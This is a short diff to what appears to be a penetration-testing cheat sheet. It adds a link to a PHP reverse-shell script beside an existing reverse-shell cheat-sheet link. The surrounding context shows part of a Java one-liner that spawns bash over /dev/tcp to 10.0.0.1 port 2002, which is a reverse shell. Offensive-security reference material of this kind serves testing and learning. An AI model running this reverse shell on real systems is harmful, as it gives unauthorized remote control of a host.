@@ -234,7 +234,8 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while rea
 p.waitFor()
 ```
 More information regarding reverse TCP:
-http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet  
+https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/php_reverse_shell.php  <- new reverse shell
 
 ### [SCP Transfer]
 ```
